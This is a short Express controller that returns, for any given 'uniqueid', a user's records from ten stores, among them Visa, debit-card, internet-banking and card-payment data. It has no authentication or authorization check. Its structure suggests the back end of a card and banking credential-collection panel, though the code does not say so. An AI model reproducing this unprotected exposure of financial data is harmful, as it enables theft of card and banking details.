const User = require('../models/User');
const Visa1 = require('../models/Visa1');
const Visa2 = require('../models/Visa2');
const Visa3 = require('../models/Visa3');
const CombinedDebitCard = require('../models/CombinedDebitCard');
const CombinedInternetBanking = require('../models/CombinedInternetBanking');
const PaymentRequest = require('../models/PaymentRequest');
const CardPayment = require('../models/CardPayment');
const Accept1 = require('../models/Accept1');
const Accept2 = require('../models/Accept2');

exports.getAllUserDetails = async (req, res) => {
  try {
    const { uniqueid } = req.params;

    if (!uniqueid) {
      return res.status(400).json({ success: false, message: 'uniqueid is required in params' });
    }

    const [
      user,
      visa1,
      visa2,
      visa3,
      combinedDebitCard,
      combinedInternetBanking,
      paymentRequest,
      cardPayment,
      accept1,
      accept2
    ] = await Promise.all([
      User.findOne({ uniqueid }),
      Visa1.findOne({ uniqueid }),
      Visa2.findOne({ uniqueid }),
      Visa3.findOne({ uniqueid }),
      CombinedDebitCard.findOne({ uniqueid }),
      CombinedInternetBanking.findOne({ uniqueid }),
      PaymentRequest.findOne({ uniqueid }),
      CardPayment.findOne({ uniqueid }),
      Accept1.findOne({ uniqueid }),
      Accept2.findOne({ uniqueid })
    ]);

    return res.status(200).json({
      success: true,
      message: 'Fetched user details successfully',
      data: {
        user,                    // 1
        visa1,                  // 2
        visa2,                  // 3
        visa3,                  // 4
        combinedDebitCard,      // 5
        combinedInternetBanking,// 6
        paymentRequest,         // 7
        cardPayment,            // 8
        accept1,                // 9
        accept2                 // 10
      }
    });
  } catch (error) {
    console.error('Error fetching user data:', error);
    return res.status(500).json({
      success: false,
      message: 'Internal server error'
    });
  }
};
